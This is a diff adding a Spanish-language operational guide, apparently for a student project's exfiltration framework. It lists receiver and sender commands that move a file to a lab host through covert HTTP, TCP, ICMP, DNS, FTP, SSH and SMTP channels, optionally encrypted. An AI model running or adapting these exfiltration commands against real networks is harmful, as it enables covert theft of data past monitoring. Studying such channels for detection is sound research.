@@ -1,0 +1,601 @@
+GUÍA OPERATIVA COMPLETA - TODOS LOS PROTOCOLOS Y MÉTODOS (7 CANALES)
+====================================================================
+
+Fecha: 2026-04-16
+Objetivo: tener comandos listos para ejecutar TODOS los métodos disponibles por protocolo,
+con una ejecución base (sin cifrado) y una ejecución adicional por método con cifrado
+(simétrico o asimétrico).
+
+--------------------------------------------------------------------
+0) COMPROBACIÓN DE DATOS ORIGINALES (IPS/PUERTOS) USADOS EN LA CONVERSACIÓN
+--------------------------------------------------------------------
+- IP servidor original aportada: 192.168.1.34
+- IFACE Npcap original aportada:
+  \Device\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}
+- Puerto TCP método 2 original aportado: 9002
+
+En esta guía se mantiene:
+- host destino principal = 192.168.1.34
+- TCP m2 = 9002
+- IFACE RAW = \Device\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}
+
+Puertos estándar complementarios usados:
+- HTTP: 8080
+- TCP: 9001
+- TCP: 9000
+- DNS: 53
+- FTP: 21
+- SSH: 22
+- SMTP submission: 587
+- IMAPS: 993
+
+--------------------------------------------------------------------
+1) VARIABLES (AJUSTAR UNA VEZ)
+--------------------------------------------------------------------
+IP_SERVIDOR=192.168.1.34
+IFACE_RAW="\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}"
+ARCHIVO=./setup.txt
+
+# Credenciales (ejemplo)
+FTP_USER=<ftp_user>
+FTP_PASS=<ftp_pass>
+SSH_USER=<ssh_user>
+SSH_PASS=<ssh_pass>
+MAIL_USER=<mail_user>
+MAIL_PASS=<mail_pass>
+MAIL_TO=<destino_mail>
+MAIL_FROM=<origen_mail>
+
+# Claves crypto
+AES_KEY=./aes.key
+RSA_PUB=./rsa_public.pem
+RSA_PRIV=./rsa_private.pem
+
+--------------------------------------------------------------------
+2) PREPARAR CRIPTOGRAFÍA
+--------------------------------------------------------------------
+2.1 Instalar dependencia
+pip install cryptography
+
+2.2 Generar clave simétrica (AES)
+python -c "import secrets, pathlib; pathlib.Path('aes.key').write_bytes(secrets.token_bytes(32)); print('OK aes.key')"
+
+2.3 Generar par RSA
+python - << 'PY'
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+k=rsa.generate_private_key(public_exponent=65537,key_size=2048)
+open('rsa_private.pem','wb').write(k.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption()))
+open('rsa_public.pem','wb').write(k.public_key().public_bytes(serialization.Encoding.PEM,serialization.PublicFormat.SubjectPublicKeyInfo))
+print('OK rsa_private.pem rsa_public.pem')
+PY
+
+--------------------------------------------------------------------
+3) ORDEN DE EJECUCIÓN (SIEMPRE)
+--------------------------------------------------------------------
+(1) Arranca RECEPTOR/Servidor
+(2) Lanza EMISOR/Cliente
+
+====================================================================
+4) HTTP (métodos 1 y 2)
+====================================================================
+
+---------------------
+HTTP Método 1 (base)
+---------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXHTTP1 --canal HTTP --metodo 1 --host 0.0.0.0 --puerto 8080 --ruta /upload --out-file ./out_http1.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXHTTP1 --canal HTTP --metodo 1 --host 192.168.1.34 --puerto 8080 --ruta /upload --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+----------------------------------------
+HTTP Método 1 (extra con cifrado SIM)
+----------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXHTTP1S --canal HTTP --metodo 1 --host 0.0.0.0 --puerto 8080 --ruta /upload --out-file ./out_http1_sym.bin --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXHTTP1S --canal HTTP --metodo 1 --host 192.168.1.34 --puerto 8080 --ruta /upload --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key --crypto-meta-out ./meta_http1_sym.json
+
+---------------------
+HTTP Método 2 (base)
+---------------------
+RECEPTOR (arranca primero):
+
+
+cd c:/TFG-REPO && python tfg_cli.py --plugins-dir plugins receive --transfer-id RXHTTP2 --canal HTTP --metodo 2 --host 0.0.0.0 --puerto 8080 --ruta /upload --out-file ./out_http2.bin --cifrado NINGUNO
+EMISOR:
+
+
+cd c:/TFG-REPO && python tfg_cli.py --plugins-dir plugins send --transfer-id RXHTTP2 --canal HTTP --metodo 2 --host 192.168.1.34 --puerto 8080 --ruta /upload --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+Y con cifrado asimétrico (RSA_OAEP), que es el que define el fichero para este método:
+
+RECEPTOR:
+
+
+cd c:/TFG-REPO && python tfg_cli.py --plugins-dir plugins receive --transfer-id RXHTTP2A --canal HTTP --metodo 2 --host 0.0.0.0 --puerto 8080 --ruta /upload --out-file ./out_http2_asym.bin --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-privada ./rsa_private.pem --crypto-meta-in ./meta_http2_asym.json
+EMISOR:
+
+
+cd c:/TFG-REPO && python tfg_cli.py --plugins-dir plugins send --transfer-id RXHTTP2A --canal HTTP --metodo 2 --host 192.168.1.34 --puerto 8080 --ruta /upload --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-publica ./rsa_public.pem --crypto-meta-out ./meta_http2_asym.json
+
+====================================================================
+5) TCP (métodos 1, 2, 3)
+====================================================================
+
+--------------------
+TCP Método 1 (base)
+--------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP1 --canal TCP --metodo 1 --host 0.0.0.0 --puerto 9001 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_tcp1.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP1 --canal TCP --metodo 1 --host 192.168.1.34 --puerto 9001 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+---------------------------------------
+TCP Método 1 (extra con cifrado ASYM)
+---------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP1A --canal TCP --metodo 1 --host 0.0.0.0 --puerto 9001 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_tcp1_asym.bin --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-privada ./rsa_private.pem --crypto-meta-in ./meta_tcp1_asym.json
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP1A --canal TCP --metodo 1 --host 192.168.1.34 --puerto 9001 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-publica ./rsa_public.pem --crypto-meta-out ./meta_tcp1_asym.json
+
+--------------------
+TCP Método 2 (base)
+--------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP2 --canal TCP --metodo 2 --host 0.0.0.0 --puerto 9002 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_tcp2.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP2 --canal TCP --metodo 2 --host 192.168.1.34 --puerto 9002 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+--------------------------------------
+TCP Método 2 (extra con cifrado SIM)
+--------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP2S --canal TCP --metodo 2 --host 0.0.0.0 --puerto 9002 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_tcp2_sym.bin --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP2S --canal TCP --metodo 2 --host 192.168.1.34 --puerto 9002 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key --crypto-meta-out ./meta_tcp2_sym.json
+
+--------------------
+TCP Método 3 (base)
+--------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP3 --canal TCP --metodo 3 --host 0.0.0.0 --puerto 9000 --out-file ./out_tcp3.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP3 --canal TCP --metodo 3 --host 192.168.1.34 --puerto 9000 --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+--------------------------------------
+TCP Método 3 (extra con cifrado ASYM)
+--------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP3A --canal TCP --metodo 3 --host 0.0.0.0 --puerto 9000 --out-file ./out_tcp3_asym.bin --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-privada ./rsa_private.pem --crypto-meta-in ./meta_tcp3_asym.json
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXTCP3A --canal TCP --metodo 3 --host 192.168.1.34 --puerto 9000 --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-publica ./rsa_public.pem --crypto-meta-out ./meta_tcp3_asym.json
+
+====================================================================
+6) ICMP (métodos 1, 2, 3)
+====================================================================
+
+---------------------
+ICMP Método 1 (base)
+---------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP1 --canal ICMP --metodo 1 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_icmp1.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXICMP1 --canal ICMP --metodo 1 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+--------------------------------------
+ICMP Método 1 (extra con cifrado SIM)
+--------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP1S --canal ICMP --metodo 1 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_icmp1_sym.bin --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXICMP1S --canal ICMP --metodo 1 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key --crypto-meta-out ./meta_icmp1_sym.json
+
+---------------------
+ICMP Método 2 (base)
+---------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP2 --canal ICMP --metodo 2 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_icmp2.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXICMP2 --canal ICMP --metodo 2 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+----------------------------------------
+ICMP Método 2 (extra con cifrado ASYM)
+----------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP2A --canal ICMP --metodo 2 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --out-file ./out_icmp2_asym.bin --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-privada ./rsa_private.pem --crypto-meta-in ./meta_icmp2_asym.json
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXICMP2A --canal ICMP --metodo 2 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado ASIMETRICO --algoritmo RSA_OAEP --clave-publica ./rsa_public.pem --crypto-meta-out ./meta_icmp2_asym.json
+
+---------------------
+ICMP Método 3 (base)
+---------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP3 --canal ICMP --metodo 3 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --ttl-base 64 --out-file ./out_icmp3.bin --cifrado NINGUNO
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXICMP3 --canal ICMP --metodo 3 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --ttl-base 64 --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado NINGUNO
+
+--------------------------------------
+ICMP Método 3 (extra con cifrado SIM)
+--------------------------------------
+RECEPTOR:
+python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP3S --canal ICMP --metodo 3 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --ttl-base 64 --out-file ./out_icmp3_sym.bin --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key
+
+EMISOR:
+python tfg_cli.py --plugins-dir plugins send --transfer-id RXICMP3S --canal ICMP --metodo 3 --host 192.168.1.34 --iface "\\Device\\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}" --ttl-base 64 --recurso-tipo ARCHIVO --recurso-ubicacion ./setup.txt --cifrado SIMETRICO --algoritmo AESGCM --clave-privada ./aes.key --crypto-meta-out ./meta_icmp3_sym.json
+
+====================================================================
+7) DNS (método 1) - EJECUCIÓN DIRECTA DE PLUGIN
+====================================================================
+
+--------------------
+DNS Método 1 (base)
+--------------------
+RECEPTOR:
+python - << 'PY'
+from plugins.exfil.dns_server import DnsServerSubdomain
+srv = DnsServerSubdomain()
+stream = srv.run({"bind_host":"0.0.0.0","bind_port":53,"exfil_id":"RXDNS1"})
+open("out_dns1.bin","wb").write(b"".join(stream))
+print("OK out_dns1.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+from plugins.exfil.dns_client import DnsClientSubdomain
+cli = DnsClientSubdomain()
+payload = [open("setup.txt","rb").read()]
+print(cli.run({"host":"192.168.1.34","port":53,"root_domain":"exfil.local","exfil_id":"RXDNS1"}, payload))
+PY
+
+---------------------------------------
+DNS Método 1 (extra con cifrado SIM)
+---------------------------------------
+RECEPTOR:
+python - << 'PY'
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.dns_server import DnsServerSubdomain
+srv = DnsServerSubdomain()
+stream = srv.run({"bind_host":"0.0.0.0","bind_port":53,"exfil_id":"RXDNS1S"})
+meta = {"nonce_prefix_b64": Path("meta_dns1_sym.json").read_text().split('"nonce_prefix_b64": "')[1].split('"')[0], "_key_bytes": Path("aes.key").read_bytes()}
+dec = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO,"AESGCM","decrypt","plugins")
+out = b"".join(dec.decrypt_iter(meta, stream))
+Path("out_dns1_sym.bin").write_bytes(out)
+print("OK out_dns1_sym.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.dns_client import DnsClientSubdomain
+enc = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO,"AESGCM","encrypt","plugins")
+key = Path("aes.key").read_bytes()
+meta = enc.init({"key_bytes": key}); meta["_key_bytes"] = key
+Path("meta_dns1_sym.json").write_text(json.dumps({k:v for k,v in meta.items() if not k.startswith("_")}))
+payload = enc.encrypt_iter(meta, [Path("setup.txt").read_bytes()])
+cli = DnsClientSubdomain()
+print(cli.run({"host":"192.168.1.34","port":53,"root_domain":"exfil.local","exfil_id":"RXDNS1S"}, payload))
+PY
+
+====================================================================
+8) FTP (métodos 2 y 3) - EJECUCIÓN DIRECTA DE PLUGIN
+====================================================================
+
+--------------------
+FTP Método 2 (base)
+--------------------
+RECEPTOR:
+python - << 'PY'
+from plugins.exfil.ftp_server_names import FtpServerNames
+srv = FtpServerNames()
+stream = srv.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP2"})
+open("out_ftp2.bin","wb").write(b"".join(stream))
+print("OK out_ftp2.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+from pathlib import Path
+from plugins.exfil.ftp_client_names import FtpClientNames
+cli = FtpClientNames()
+print(cli.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP2"}, [Path("setup.txt").read_bytes()]))
+PY
+
+----------------------------------------
+FTP Método 2 (extra con cifrado ASYM)
+----------------------------------------
+RECEPTOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ftp_server_names import FtpServerNames
+srv = FtpServerNames()
+stream = srv.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP2A"})
+meta = json.loads(Path("meta_ftp2_asym.json").read_text()); meta["_private_key_bytes"] = Path("rsa_private.pem").read_bytes()
+dec = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO,"RSA_OAEP","decrypt","plugins")
+Path("out_ftp2_asym.bin").write_bytes(b"".join(dec.decrypt_iter(meta, stream)))
+print("OK out_ftp2_asym.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ftp_client_names import FtpClientNames
+enc = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO,"RSA_OAEP","encrypt","plugins")
+meta = enc.init({"public_key_bytes": Path("rsa_public.pem").read_bytes()})
+Path("meta_ftp2_asym.json").write_text(json.dumps({k:v for k,v in meta.items() if not k.startswith("_")}))
+payload = enc.encrypt_iter(meta, [Path("setup.txt").read_bytes()])
+cli = FtpClientNames()
+print(cli.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP2A"}, payload))
+PY
+
+--------------------
+FTP Método 3 (base)
+--------------------
+RECEPTOR:
+python - << 'PY'
+from plugins.exfil.ftp_server_size import FtpServerSize
+srv = FtpServerSize()
+stream = srv.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP3"})
+open("out_ftp3.bin","wb").write(b"".join(stream))
+print("OK out_ftp3.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+from pathlib import Path
+from plugins.exfil.ftp_client_size import FtpClientSize
+cli = FtpClientSize()
+print(cli.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP3"}, [Path("setup.txt").read_bytes()]))
+PY
+
+--------------------------------------
+FTP Método 3 (extra con cifrado SIM)
+--------------------------------------
+RECEPTOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ftp_server_size import FtpServerSize
+srv = FtpServerSize()
+stream = srv.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP3S"})
+meta = json.loads(Path("meta_ftp3_sym.json").read_text()); meta["_key_bytes"] = Path("aes.key").read_bytes()
+dec = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO,"AESGCM","decrypt","plugins")
+Path("out_ftp3_sym.bin").write_bytes(b"".join(dec.decrypt_iter(meta, stream)))
+print("OK out_ftp3_sym.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ftp_client_size import FtpClientSize
+enc = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO,"AESGCM","encrypt","plugins")
+key = Path("aes.key").read_bytes(); meta = enc.init({"key_bytes": key}); meta["_key_bytes"] = key
+Path("meta_ftp3_sym.json").write_text(json.dumps({k:v for k,v in meta.items() if not k.startswith("_")}))
+payload = enc.encrypt_iter(meta, [Path("setup.txt").read_bytes()])
+cli = FtpClientSize()
+print(cli.run({"host":"192.168.1.34","port":21,"user":"<ftp_user>","password":"<ftp_pass>","root":"/","exfil_id":"RXFTP3S"}, payload))
+PY
+
+====================================================================
+9) SSH (métodos 2 y 3) - EJECUCIÓN DIRECTA DE PLUGIN
+====================================================================
+
+--------------------
+SSH Método 2 (base)
+--------------------
+RECEPTOR:
+python - << 'PY'
+from plugins.exfil.ssh_server_names import SshServerNames
+srv = SshServerNames()
+stream = srv.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH2","poll_interval_s":0.5,"timeout_s":60})
+open("out_ssh2.bin","wb").write(b"".join(stream))
+print("OK out_ssh2.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+from pathlib import Path
+from plugins.exfil.ssh_client_names import SshClientNames
+cli = SshClientNames()
+print(cli.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH2"}, [Path("setup.txt").read_bytes()]))
+PY
+
+---------------------------------------
+SSH Método 2 (extra con cifrado SIM)
+---------------------------------------
+RECEPTOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ssh_server_names import SshServerNames
+srv = SshServerNames()
+stream = srv.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH2S","poll_interval_s":0.5,"timeout_s":60})
+meta = json.loads(Path("meta_ssh2_sym.json").read_text()); meta["_key_bytes"] = Path("aes.key").read_bytes()
+dec = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO,"AESGCM","decrypt","plugins")
+Path("out_ssh2_sym.bin").write_bytes(b"".join(dec.decrypt_iter(meta, stream)))
+print("OK out_ssh2_sym.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ssh_client_names import SshClientNames
+enc = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO,"AESGCM","encrypt","plugins")
+key = Path("aes.key").read_bytes(); meta = enc.init({"key_bytes": key}); meta["_key_bytes"] = key
+Path("meta_ssh2_sym.json").write_text(json.dumps({k:v for k,v in meta.items() if not k.startswith("_")}))
+payload = enc.encrypt_iter(meta, [Path("setup.txt").read_bytes()])
+cli = SshClientNames()
+print(cli.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH2S"}, payload))
+PY
+
+--------------------
+SSH Método 3 (base)
+--------------------
+RECEPTOR:
+python - << 'PY'
+from plugins.exfil.ssh_server_size import SshServerSize
+srv = SshServerSize()
+stream = srv.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH3","poll_interval_s":0.5,"timeout_s":60})
+open("out_ssh3.bin","wb").write(b"".join(stream))
+print("OK out_ssh3.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+from pathlib import Path
+from plugins.exfil.ssh_client_size import SshClientSize
+cli = SshClientSize()
+print(cli.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH3"}, [Path("setup.txt").read_bytes()]))
+PY
+
+----------------------------------------
+SSH Método 3 (extra con cifrado ASYM)
+----------------------------------------
+RECEPTOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ssh_server_size import SshServerSize
+srv = SshServerSize()
+stream = srv.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH3A","poll_interval_s":0.5,"timeout_s":60})
+meta = json.loads(Path("meta_ssh3_asym.json").read_text()); meta["_private_key_bytes"] = Path("rsa_private.pem").read_bytes()
+dec = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO,"RSA_OAEP","decrypt","plugins")
+Path("out_ssh3_asym.bin").write_bytes(b"".join(dec.decrypt_iter(meta, stream)))
+print("OK out_ssh3_asym.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.ssh_client_size import SshClientSize
+enc = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO,"RSA_OAEP","encrypt","plugins")
+meta = enc.init({"public_key_bytes": Path("rsa_public.pem").read_bytes()})
+Path("meta_ssh3_asym.json").write_text(json.dumps({k:v for k,v in meta.items() if not k.startswith("_")}))
+payload = enc.encrypt_iter(meta, [Path("setup.txt").read_bytes()])
+cli = SshClientSize()
+print(cli.run({"host":"192.168.1.34","port":22,"user":"<ssh_user>","password":"<ssh_pass>","remote_dir":".","exfil_id":"RXSSH3A"}, payload))
+PY
+
+====================================================================
+10) SMTP (método 1) - EJECUCIÓN DIRECTA DE PLUGIN
+====================================================================
+
+---------------------
+SMTP Método 1 (base)
+---------------------
+RECEPTOR (IMAP):
+python - << 'PY'
+from plugins.exfil.smtp_server import SmtpServerHeaders
+srv = SmtpServerHeaders()
+stream = srv.run({"imap_host":"192.168.1.34","imap_port":993,"imap_user":"<mail_user>","imap_pass":"<mail_pass>","imap_ssl":True,"imap_starttls":False,"mailbox":"INBOX","exfil_id":"RXSMTP1"})
+open("out_smtp1.bin","wb").write(b"".join(stream))
+print("OK out_smtp1.bin")
+PY
+
+EMISOR (SMTP):
+python - << 'PY'
+from pathlib import Path
+from plugins.exfil.smtp_client import SmtpClientHeaders
+cli = SmtpClientHeaders()
+print(cli.run({"smtp_host":"192.168.1.34","smtp_port":587,"smtp_user":"<mail_user>","smtp_pass":"<mail_pass>","to":"<destino_mail>","from":"<origen_mail>","starttls":True,"exfil_id":"RXSMTP1"}, [Path("setup.txt").read_bytes()]))
+PY
+
+----------------------------------------
+SMTP Método 1 (extra con cifrado ASYM)
+----------------------------------------
+RECEPTOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.smtp_server import SmtpServerHeaders
+srv = SmtpServerHeaders()
+stream = srv.run({"imap_host":"192.168.1.34","imap_port":993,"imap_user":"<mail_user>","imap_pass":"<mail_pass>","imap_ssl":True,"imap_starttls":False,"mailbox":"INBOX","exfil_id":"RXSMTP1A"})
+meta = json.loads(Path("meta_smtp1_asym.json").read_text()); meta["_private_key_bytes"] = Path("rsa_private.pem").read_bytes()
+dec = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO,"RSA_OAEP","decrypt","plugins")
+Path("out_smtp1_asym.bin").write_bytes(b"".join(dec.decrypt_iter(meta, stream)))
+print("OK out_smtp1_asym.bin")
+PY
+
+EMISOR:
+python - << 'PY'
+import json
+from pathlib import Path
+from tfg.plugins.loader import resolve_crypto_plugin
+from tfg.core.enums import EsquemaCifrado
+from plugins.exfil.smtp_client import SmtpClientHeaders
+enc = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO,"RSA_OAEP","encrypt","plugins")
+meta = enc.init({"public_key_bytes": Path("rsa_public.pem").read_bytes()})
+Path("meta_smtp1_asym.json").write_text(json.dumps({k:v for k,v in meta.items() if not k.startswith("_")}))
+payload = enc.encrypt_iter(meta, [Path("setup.txt").read_bytes()])
+cli = SmtpClientHeaders()
+print(cli.run({"smtp_host":"192.168.1.34","smtp_port":587,"smtp_user":"<mail_user>","smtp_pass":"<mail_pass>","to":"<destino_mail>","from":"<origen_mail>","starttls":True,"exfil_id":"RXSMTP1A"}, payload))
+PY
+
+--------------------------------------------------------------------
+11) LISTADO DE REQUISITOS USADOS
+--------------------------------------------------------------------
+Infra / red:
+- IP servidor: 192.168.1.34
+- IFACE RAW: \Device\NPF_{250796F9-626D-4EA7-8F34-7051215FD27E}
+- Puertos: 53, 21, 22, 587, 993, 8080, 9000, 9001, 9002
+
+Software / librerías:
+- Python 3
+- cryptography (para AESGCM/RSA_OAEP)
+- dnslib (DNS)
+- paramiko (SSH/SFTP)
